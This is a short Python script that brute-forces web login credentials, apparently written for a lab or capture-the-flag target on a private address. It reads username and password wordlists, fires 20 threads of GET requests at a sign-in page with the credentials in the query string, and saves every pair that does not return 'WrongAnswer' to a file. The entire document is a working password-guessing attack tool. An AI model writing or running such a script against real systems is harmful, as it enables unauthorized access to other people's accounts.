#!/usr/bin/python3

"""Brute force authentication credentials"""

import requests
from concurrent.futures import ThreadPoolExecutor

with open("./users-db-small.txt", "r", errors="surrogateescape") as f:
    users = f.readlines()

with open("./passwds-db-small.txt", "r", errors="surrogateescape") as f:
    passwords = f.readlines()

def try_combination(user, password):
    try:
        print(f"try {user}:{password}...") 
        r = requests.get(f"http://192.168.0.160/?page=signin&user={user}&password={password}&Login=Login#")
        if not "WrongAnswer" in r.text:
            with open("found.txt", "a+") as f:
                f.write(f"{user}:{password}\n")
    except requests.exceptions.RequestException as e:
        print("EXCEPTION ", e)
        pass


def runner():
    threads = []
    with ThreadPoolExecutor(max_workers=20) as executor:
        for user in users:
            for i in range(len(passwords)):
                threads.append(executor.submit(try_combination, user.strip(), passwords[i].strip()))

runner()
